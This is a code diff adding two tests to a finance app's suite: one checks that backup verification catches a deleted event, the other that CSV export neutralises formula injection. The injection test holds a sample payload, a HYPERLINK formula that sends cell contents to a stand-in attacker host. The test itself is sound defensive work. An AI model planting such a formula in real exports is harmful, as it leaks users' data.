@@ -171,6 +171,26 @@ describe("R40.2 · verified restore", () => {
     });
   });
 
+  test("SECURITY-OPS-23 · catches a backup that has lost an event", () => {
+    withTempDir((dir) => {
+      const { db, accountId } = setup(dir);
+      const backupDir = join(dir, "backups");
+      createBackup(db, backupDir);
+      // Later writes are normal, and must not excuse the hole below.
+      createTransaction(db, actor, { accountId, amount: rupees(-500), date: "2026-08-20" });
+
+      const path = listBackups(backupDir)[0]!.path;
+      const copy = new DatabaseSync(path);
+      copy.exec(`DELETE FROM events WHERE seq = 2`);
+      copy.close();
+
+      const result = verifyRestore(db, backupDir);
+      assert.equal(result.ok, false, result.summary);
+      assert.ok(result.mismatches.some((m) => /event log.*missing/.test(m)), result.summary);
+      db.close();
+    });
+  });
+
   test("tolerates writes made after the snapshot", () => {
     withTempDir((dir) => {
       const { db, accountId } = setup(dir);
@@ -334,6 +354,26 @@ describe("F15 · export", () => {
       });
       const csv = exportTransactionsCsv(db);
       assert.match(csv, /"milk, bread and ""eggs"""/);
+      db.close();
+    });
+  });
+
+  test("SECURITY-OPS-20 · a narration that is a formula comes out as text", () => {
+    withTempDir((dir) => {
+      const { db, accountId } = setup(dir);
+      // Whoever sent the alert chose this text, and a spreadsheet would run it.
+      const evil = '=HYPERLINK("http://attacker.example/?d="&A1,"Refund")';
+      createTransaction(db, actor, {
+        accountId, amount: rupees(-450), date: "2026-08-14", payeeName: "@Refund desk",
+        memo: "+91 call back", raw: { narration: evil, amount: "450.00" },
+      });
+      const csv = exportTransactionsCsv(db);
+      const cells = csv.split("\n").find((l) => l.includes("HYPERLINK"))!;
+      assert.ok(cells.includes(`"'=HYPERLINK(""http://attacker.example/?d=""&A1,""Refund"")"`), cells);
+      assert.ok(cells.includes(",'@Refund desk,"), cells);
+      assert.ok(cells.includes(",'+91 call back,"), cells);
+      // An amount is a number, not a formula, and stays summable.
+      assert.ok(cells.includes(",-45000,"), cells);
       db.close();
     });
   });
